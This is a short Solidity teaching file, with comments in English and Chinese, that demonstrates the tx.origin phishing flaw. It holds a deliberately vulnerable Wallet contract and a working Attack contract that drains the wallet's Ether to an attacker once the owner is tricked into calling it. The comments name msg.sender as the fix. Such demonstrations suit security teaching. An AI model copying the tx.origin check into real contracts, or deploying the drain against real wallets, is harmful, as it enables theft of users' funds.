// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title x
 * @dev   x
 */

/*
Wallet is a simple contract where only the owner should be able to transfer
Ether to another address. Wallet.transfer() uses tx.origin to check that the
caller is the owner. Let's see how we can hack this contract
*/

/*
1. Alice deploys Wallet with 10 Ether
2. Eve deploys Attack with the address of Alice's Wallet contract.
3. Eve tricks Alice to call Attack.attack()
4. Eve successfully stole Ether from Alice's wallet

What happened?
爱丽丝被诱骗拨打了Attack.Attack（）。在Attack.Attack（）中，它请求将Alice钱包中的所有资金转移到Eve的地址。
由于Wallet.transfer（）中的tx.orgin等于Alice的地址，因此它授权了转账。钱包把所有的以太币都转移给了夏娃。
*/



contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
//        预防技术
//        使用msg.sender 而不实用tx.orgin
        require(tx.origin == owner, "Not owner");

        (bool sent,) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;

    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
    
}
